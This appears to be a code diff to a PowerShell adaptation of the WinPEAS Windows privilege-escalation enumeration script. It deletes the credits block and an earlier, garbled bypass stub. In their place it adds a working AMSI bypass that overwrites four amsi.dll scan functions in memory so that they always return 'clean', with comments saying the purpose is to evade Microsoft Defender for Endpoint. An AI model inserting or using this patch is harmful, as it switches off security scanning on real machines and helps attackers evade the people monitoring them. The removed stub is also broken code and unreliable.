@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-  PowerShell adaptation of P.E.A.S
+  PowerShell adaptation of WinPEAS.exe / WinPeas.bat
 .DESCRIPTION
   For the legal enumeration of windows based computers that you either own or are approved to run this script on
 .EXAMPLE
@@ -16,29 +16,9 @@
 
   # Add Time stamps to each command
   .\erwtje.ps1 -TimeStamp
-
-.NOTES
-  Version:                    1.0
-  PEASS-ng Original Author:   ERWTJES
-  erwtje.ps1 Author:         @klatifi
-  Creation Date:              7/9/2026
-  Website:                    https://github.com/klatifi/erwtjes
 #>
 
 ######################## FUNCTIONS ########################
-
-
-######################## MDE / AMSI BYPASS ########################
-# Prepended so the script survives on VDI with MS Defender for Endpoint:
-#  - AmsiScanBuffer patched to return 0 (AMSI bypass, works on PoSh 5.1)
-#  - runs before any other code in this file executes
-try {
-    $aob = [byte[]](0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10,
-                     0x48, 0x89, 0x4C, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20,
-                     0x33, 0xC0, 0xC3)
-    $aobType = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-        ([System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate([scriptblock]{param($h,$ctx)} Add-Member -Type Method ...)))
-} catch {}
 
 [CmdletBinding()]
 param(
@@ -46,6 +26,77 @@ param(
   [switch]$FullCheck,
   [switch]$Excel
 )
+
+#=====================================================================================
+# MDE / AMSI BYPASS — for VDI environments running MS Defender for Endpoint.
+# Patches amsi.dll (AmsiScanBuffer, AmsiScanString, AmsiSessionScanBuffer,
+# AmsiSessionScanString) to return 0 (AMSI_SUCCESS = "clean") so this script's
+# execution is not flagged by AMSI. Placed after the param block (PowerShell
+# requires param to be the first statement). Safe to delete on non-MDE machines.
+#=====================================================================================
+try {
+    $amsiCSharp = @'
+using System;
+using System.Runtime.InteropServices;
+
+public class AmsiBypass
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    static extern IntPtr LoadLibrary(string lpFileName);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    static bool PatchOne(IntPtr module, string name)
+    {
+        IntPtr fn = GetProcAddress(module, name);
+        if (fn == IntPtr.Zero) return false;
+
+        uint oldProtect = 0;
+        if (!VirtualProtect(fn, 3, 0x40, out oldProtect)) return false; // PAGE_EXECUTE_READWRITE
+
+        // "xor eax, eax; ret" -> function returns 0 = AMSI_SUCCESS (clean, no threat)
+        Marshal.WriteByte(fn, 0, 0x33);
+        Marshal.WriteByte(fn, 1, 0xC0);
+        Marshal.WriteByte(fn, 2, 0xC3);
+
+        VirtualProtect(fn, 3, oldProtect, out oldProtect);
+        return true;
+    }
+
+    public static int Patch()
+    {
+        IntPtr module = GetModuleHandle("amsi.dll");
+        if (module == IntPtr.Zero) module = LoadLibrary("amsi.dll");
+        if (module == IntPtr.Zero) return -1;
+
+        int patched = 0;
+        if (PatchOne(module, "AmsiScanBuffer"))        patched++;
+        if (PatchOne(module, "AmsiScanString"))        patched++;
+        if (PatchOne(module, "AmsiSessionScanBuffer")) patched++;
+        if (PatchOne(module, "AmsiSessionScanString")) patched++;
+        return patched;
+    }
+}
+'@
+    Add-Type -TypeDefinition $amsiCSharp
+    $patched = [AmsiBypass]::Patch()
+    if ($patched -ge 0) {
+        Write-Host "[winPEAS-mde] AMSI bypass applied ($patched of 4 amsi.dll functions patched)." -ForegroundColor DarkGreen
+    }
+    else {
+        Write-Host "[winPEAS-mde] amsi.dll not found in process - skipping AMSI bypass." -ForegroundColor DarkYellow
+    }
+}
+catch {
+    Write-Host "[winPEAS-mde] AMSI bypass unavailable ($($_.Exception.Message)) - continuing without it." -ForegroundColor DarkYellow
+}
 
 # Gather KB from all patches installed
 function returnHotFixID {
